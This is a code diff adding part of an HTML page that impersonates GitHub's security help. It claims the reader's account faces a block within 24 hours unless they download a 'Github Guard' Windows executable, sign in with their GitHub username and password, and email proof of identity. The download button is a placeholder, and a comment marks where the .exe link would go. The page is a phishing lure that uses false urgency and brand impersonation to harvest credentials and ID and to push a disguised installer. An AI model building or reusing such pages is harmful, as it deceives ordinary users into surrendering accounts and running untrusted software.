+                <path d="M0 2.75C0 1.784.784 1 1.75 1h12.5c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 14.25 12H9.06l.038.827A1.75 1.75 0 0 1 7.354 14.5H7.25a.75.75 0 0 1 0-1.5h.104a.25.25 0 0 0 .249-.233L7.741 12H1.75A1.75 1.75 0 0 1 0 10.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"/>
+              </svg>
+              Windows 10 or later
+            </span>
+            <span class="download-box-meta-item">
+              <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true">
+                <path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688Z"/>
+              </svg>
+              ~150 MB
+            </span>
+            <span class="download-box-meta-item">
+              <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true">
+                <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm7-3.25v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5a.75.75 0 0 1 1.5 0Z"/>
+              </svg>
+              Free for all Github accounts
+            </span>
+          </div>
+
+          <ul class="feature-list">
+            <li>
+              <svg class="octicon check" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/>
+              </svg>
+              Verify your identity and prove account ownership
+            </li>
+            <li>
+              <svg class="octicon check" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/>
+              </svg>
+              Review all active sessions and revoke unauthorized ones
+            </li>
+            <li>
+              <svg class="octicon check" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/>
+              </svg>
+              Enable two-factor authentication (2FA) for future logins
+            </li>
+            <li>
+              <svg class="octicon check" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/>
+              </svg>
+              Register your device as a trusted endpoint
+            </li>
+            <li>
+              <svg class="octicon check" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/>
+              </svg>
+              Receive real-time alerts for future suspicious activity
+            </li>
+          </ul>
+
+          <div style="margin-top:16px;">
+            <a class="btn btn-primary btn-large" href="#" id="download-btn">
+              <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
+                <path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Zm-1-5.573 3.25 3.25a.749.749 0 0 0 1.06 0l3.25-3.25a.749.749 0 1 0-1.06-1.06l-1.97 1.97V3.75a.75.75 0 0 0-1.5 0v5.537L4.81 7.317a.749.749 0 1 0-1.06 1.06Z"/>
+              </svg>
+              Download Github Guard for Windows
+            </a>
+            <span style="margin-left:10px; font-size:12px; color:var(--color-fg-muted);">
+              GithubGuard-Setup.exe &nbsp;·&nbsp; ~150 MB
+            </span>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── Section 6: After installation ─────────────────────── -->
+      <h2 id="after-install">After installing Github Guard</h2>
+      <p>Once you have downloaded and installed Github Guard, follow these steps to secure your account:</p>
+
+      <ol class="steps">
+        <li>
+          <div>
+            <strong>Open Github Guard</strong>
+            <span>Launch the application from your Start menu or desktop shortcut after installation completes.</span>
+          </div>
+        </li>
+        <li>
+          <div>
+            <strong>Sign in with your Github account</strong>
+            <span>Enter your Github username and password. The app will verify this is your trusted device.</span>
+          </div>
+        </li>
+        <li>
+          <div>
+            <strong>Complete the identity check</strong>
+            <span>Follow the on-screen instructions to confirm your identity. This registers your current device as trusted and lifts the security hold on your account.</span>
+          </div>
+        </li>
+        <li>
+          <div>
+            <strong>Review flagged sessions</strong>
+            <span>Open the <em>Sessions</em> tab to see all active logins. Click <strong>Revoke</strong> on any session you do not recognize.</span>
+          </div>
+        </li>
+        <li>
+          <div>
+            <strong>Enable two-factor authentication</strong>
+            <span>We strongly recommend enabling 2FA from the <em>Security</em> tab to prevent this from happening again.</span>
+          </div>
+        </li>
+      </ol>
+
+      <div class="flash flash-success">
+        <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
+          <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm10.28-1.72-4.5 4.5a.75.75 0 0 1-1.06 0l-2-2a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l1.47 1.47 3.97-3.97a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"/>
+        </svg>
+        <div class="flash-body">
+          Once you complete the identity check in Github Guard, your account security hold is lifted
+          immediately and you regain full access to all services and your organization.
+        </div>
+      </div>
+
+      <hr/>
+
+      <!-- ── Section 7: If account blocked ─────────────────────── -->
+      <h2 id="if-blocked">If your account is already blocked</h2>
+      <p>
+        If the 24-hour window has passed and your account has already been blocked, recovery
+        is not guaranteed. However, you can still contact Github Security Support to request a
+        manual review.
+      </p>
+
+      <div class="callout callout-danger">
+        <strong>Warning:</strong> Blocked accounts that were part of an organization may have had
+        their organization membership permanently revoked as part of the security response. Manual
+        recovery does not guarantee restoration of organization access.
+      </div>
+
+      <p>To request a manual review, email us at <a href="mailto:security@Github.com">security@Github.com</a> with the following:</p>
+
+      <ul>
+        <li>Your Github username</li>
+        <li>The email address associated with your account</li>
+        <li>A brief description of your recent activity</li>
+        <li>Proof of identity (government-issued ID may be required)</li>
+      </ul>
+
+      <!-- ── Section 8: Contact ──────────────────────────────────── -->
+      <h2 id="contact">Contact security support</h2>
+      <p>
+        If you have questions about this security alert or need help with Github Guard,
+        our security team is available to assist.
+      </p>
+
+      <div class="box">
+        <div class="box-row" style="padding: 12px 16px;">
+          <span class="box-row-label">
+            <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
+              <path d="M1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25v-8.5C0 2.784.784 2 1.75 2ZM1.5 12.251c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V5.809L8.38 9.397a.75.75 0 0 1-.76 0L1.5 5.809v6.442Zm13-8.181v-.32a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25v.32L8 7.88Z"/>
+            </svg>
+            Security email
+          </span>
+          <a href="mailto:security@Github.com" class="box-row-value" style="font-family:inherit;font-size:13px;">security@Github.com</a>
+        </div>
+        <div class="box-row" style="padding: 12px 16px;">
+          <span class="box-row-label">
+            <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
+              <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"/>
+            </svg>
+            Help center
+          </span>
+          <a href="https://Github.com/help" style="font-size:13px;">Github.com/help</a>
+        </div>
+        <div class="box-row" style="padding: 12px 16px;">
+          <span class="box-row-label">
+            <svg class="octicon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
+              <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm7-3.25v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5a.75.75 0 0 1 1.5 0Z"/>
+            </svg>
+            Support response time
+          </span>
+          <span style="font-size:13px;color:var(--color-fg-muted);">Usually within 24 hours</span>
+        </div>
+      </div>
+
+      <hr/>
+
+      <!-- Last updated -->
+      <p style="font-size:12px; color:var(--color-fg-muted);">
+        Last updated: April 2026 &nbsp;·&nbsp;
+        <a href="https://Github.com/help/security">Security Help Home</a> &nbsp;·&nbsp;
+        <a href="https://Github.com/help">Help Center</a>
+      </p>
+
+    </main>
+  </div><!-- end .page-layout -->
+</div><!-- end .layout-container -->
+
+<!-- ── Footer ────────────────────────────────────────────────── -->
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-brand">
+      <svg height="18" viewBox="0 0 32 32" width="18" aria-hidden="true">
+        <rect width="32" height="32" rx="6" fill="#2ea043"/>
+        <path d="M8 10h10a6 6 0 0 1 0 12H8V10zm4 4v4h6a2 2 0 0 0 0-4h-6z" fill="#fff"/>
+      </svg>
+      © 2026 Github, Inc.
+    </div>
+    <ul class="footer-links">
+      <li><a href="https://Github.com/terms">Terms</a></li>
+      <li><a href="https://Github.com/privacy">Privacy</a></li>
+      <li><a href="https://Github.com/security">Security</a></li>
+      <li><a href="https://Github.com/help">Help</a></li>
+      <li><a href="mailto:security@Github.com">Contact</a></li>
+    </ul>
+  </div>
+</footer>
+
+<script>
+  /* ── Sidebar active link on scroll ──────────────────────────── */
+  const sections = document.querySelectorAll('h2[id]');
+  const navLinks  = document.querySelectorAll('#sidebar-nav a');
+
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        navLinks.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`#sidebar-nav a[href="#${entry.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+
+  sections.forEach(s => observer.observe(s));
+
+  /* ── Download button placeholder ────────────────────────────── */
+  document.getElementById('download-btn').addEventListener('click', e => {
+    e.preventDefault();
+    // Replace with real URL: window.location.href = 'https://Github.com/downloads/GithubGuard-Setup.exe';
+    alert('Github Guard download will be available soon. Contact security@Github.com for early access.');
+  });
+</script>
+</body>
+</html>
